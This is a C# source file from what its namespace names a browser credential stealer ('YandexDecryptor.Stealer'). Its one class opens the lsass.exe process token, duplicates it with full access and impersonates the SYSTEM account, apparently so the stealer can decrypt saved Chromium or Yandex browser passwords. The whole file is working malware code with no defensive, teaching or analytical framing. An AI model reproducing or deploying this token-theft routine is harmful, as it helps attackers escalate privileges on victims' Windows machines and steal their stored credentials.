using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Runtime.InteropServices;

namespace YandexDecryptor.Stealer.Browsers.Chromium
{
    internal sealed class Elevator
    {

        #region WinApi

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, out IntPtr TokenHandle);

        
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DuplicateTokenEx(
            IntPtr ExistingTokenHandle,
            int dwDesiredAccess,
            IntPtr lpTokenAttributes,
            int ImpersonationLevel,
            int TokenType,
            out IntPtr DuplicateTokenHandle);

        private const int TOKEN_DUPLICATE = 0x0002;
        private const int TOKEN_QUERY = 0x0008;
        private const int TOKEN_ALL_ACCESS = 0xF01FF;

        #endregion

        private static IntPtr FindLsassProcess()
        {
            Process[] processes = Process.GetProcessesByName("lsass");
            if (processes.Length == 0)
            {
                throw new Exception("Failed to find lsass.exe");
            }

            return processes[0].Handle;
        }


        public static WindowsImpersonationContext ImpersonateSystem()
        {
            IntPtr processHandle = FindLsassProcess();

            if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_QUERY, out IntPtr tokenHandle))
                throw new Exception("Failed open process token.");

            if (!DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, IntPtr.Zero, 2, 1, out IntPtr duplicatedToken))
                throw new Exception("Failed to impersonate");

            // Создаем объект WindowsIdentity на основе токена
            using (WindowsIdentity identity = new WindowsIdentity(duplicatedToken))
            {
                return identity.Impersonate();
            }
        }


    }
}
